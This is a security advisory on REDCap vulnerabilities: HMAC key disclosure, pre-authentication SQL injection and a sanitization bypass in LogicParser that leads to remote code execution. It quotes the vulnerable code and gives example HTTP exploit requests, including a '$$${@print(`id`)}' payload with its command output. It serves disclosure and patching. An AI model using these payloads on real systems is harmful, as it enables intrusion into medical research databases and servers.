# VUMC REDCap - Multiple Vulnerabilities

## Vendors

* Vanderbilt University Medical Center (VUMC)

## Affected Products

REDCap versions prior to 16.0.39 LTS and 17.2.3 Standard Release.

## Summary

Atredis identified multiple flaws in REDCap that can be exploited by an unauthenticated attacker that when chained could result in remote code execution (RCE). These flaws include study code enumeration, project Hash-based Message Authentication Code (HMAC) key disclosure, pre-authentication SQL injection, and a bypass in the patch implemented by Vanderbilt to prevent a remote code execution (RCE) vulnerability in the REDCap LogicParser found by Atredis previously. 

These vulnerabilities were dynamically tested and confirmed on REDCap v17.1.4 and some versions of v15.x.

## Remediation/Mitigation

Update REDCap to versions 16.0.39 LTS, 17.2.3 Standard Release, or later.

## Credit

This issue was found by Justin Kennedy and Mike Alfaro of Atredis Partners.

`redcap_<version>/Classes/MyCap/Api/Handler/MiscHandler.php`

In the code above, as long as a valid `stu_code` is provided, the `getAccessKey` function will return the HMAC key for the given project. The HMAC key can be used to generate valid signatures for requests sent to the MyCap APIs.

### SQL Injection via getStudyFile

The MyCap `getFileNames` function is called from the `getStudyFile` action with user-supplied `$fil_category` and `$fil_name` values. By setting the user-supplied `$fil_category` to `.PromisForm` or `.PromisCalibration`, the user-supplied `$fil_name` is used directly in a SQL query without being escaped or parameterized:

```php
public static function getFileNames($fil_category, $fil_name, $projectId, $projectCode) {
    $values = array();
    switch ($fil_category) {
        case self::FILE_CATEGORY_IMAGE:
            $sql = "SELECT custom_logo FROM redcap_mycap_aboutpages WHERE project_id = '".$projectId."' AND image_type = '".Page::IMAGETYPE_CUSTOM."'";
            $q = db_query($sql);
            while ($row = db_fetch_assoc($q))
            {
                $values[] = \Files::getEdocName($row['custom_logo'], true);
            }
            break;
        case self::FILE_CATEGORY_PROMIS_FORM:
        case self::FILE_CATEGORY_PROMIS_CALIBRATION:

            if ($fil_category == self::FILE_CATEGORY_PROMIS_FORM) {
                $category = 1;
            } else if ($fil_category == self::FILE_CATEGORY_PROMIS_CALIBRATION) {
                $category = 2;
            }
            $sql = "SELECT * FROM redcap_mycap_projectfiles WHERE project_code = '".$projectCode."' AND category = '".$category."' AND name = '".$fil_name."'";
```
`redcap_<version>/Classes/MyCap/MyCap.php`

Atredis confirmed dynamically that it was possible to exploit this SQL injection vulnerability to exfiltrate data from the backend database:

```http
POST /api/?type=module&prefix=mycap HTTP/1.1

content=mycap&action=getStudyFile&stu_code=P-<REDACTED>&fil_category=.PromisForm&fil_name='<injected_query>&expires=1900000000&signature=<signature_using_leaked_hmac_key</caption>
```
`Exploiting the SQL Injection Vulnerability`

An attacker could use this SQL injection vulnerability to exfiltrate data from the backend database, including the stored password reset token for one of the local administrator accounts on the REDCap instance and gain administrative access to the REDCap application.

### Remote Code Execution via LogicParser

In previous years testing, Atredis was able to gain remote code execution (RCE) in REDCap by exploiting REDCap's LogicParser. This vulnerability was escalated to Vanderbilt and a patch was put into place. Atredis has identified a bypass for the latest patch. The LogicParser attempts to use regular expressions to detect and strip characters that are used to invoke PHP code:

```php
/**
 * Removes comments from logic expressions AND also ` backticks and PHP expression syntax like ${`command`}, which can be dangerous.
 * Comments must start with // and lines with comments must only contain comments or whitespace and comments.
 * @param string $str 
 * @return string
 */
public static function removeCommentsAndSanitize($str)
{
    // Remove inline comments, which will begin with // or #
	$no_comment = function($line) {
		$s = trim($line);
		return !(starts_with($s, "//") || starts_with($s, "#"));
	};
    $str = join("\n", array_filter(explode("\n", $str), $no_comment));

    // Remove $ dollar signs and ` backticks, which can be dangerous.
    $str = self::sanitizeExpressionSyntax($str);

	return $str;
}

// Remove all ` backticks and sanitize PHP expression syntax like ${`command`}, which can be dangerous
public static function sanitizeExpressionSyntax($input) {
	if (strpos($input, "$") !== false) {
		// Neutralize variable expression syntax like ${`command`} or $\{`command`}
		// Remove the '$' and an optional backslash immediately after it, keep the {...}
		$input = preg_replace('/\$(?:\\\\)?(\{.*?\})/s', '$1', $input);
		// Neutralize syntax like {$_GET['a']('hostname')} or {$\_GET['a']('hostname')}
		// Remove the opening '{$' (with optional backslash after the $) and the closing '}'
		$input = preg_replace('/\{\$(?:\\\\)?(.*?)\}/s', '$1', $input);
	}
	return $input;
}
```
`redcap_<version>/Classes/LogicParser.php`

The use of `preg_replace` in the functions above do not remove all instances of the characters being stripped. For example, the string `${}` would become `{}`, but the string `$${}` would become `${}`. In some cases, the `removeCommentsAndSanitize` function is called twice on the user-supplied data, meaning `$${}` would become `{}`; however, as mentioned previously, the usage of `preg_replace` does not replace all instances, so it is possible to bypass this sanitization process by prepending one additional `$` to the input so that `$$${}` becomes `${}`, resulting in execution PHP code.

Atredis was able to validate dynamically that it was possible to use the Logic Tester in the Designer tool to execute arbitrary PHP code using this bypass:

```http
POST /redcap_<version>/Design/logic_test_record.php?pid=<pid> HTTP/1.1

hasrecordevent=0&record=1%7C%7C&logic=<@urlencode>concat("", "$$${@print(`id`)}")</@urlencode>&redcap_csrf_token=<REDACTED>
```
`Executing the id Operating System Command`

The server response contained the output of the command:

```http
HTTP/1.1 200 OK

uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```
`Confirmed Execution`
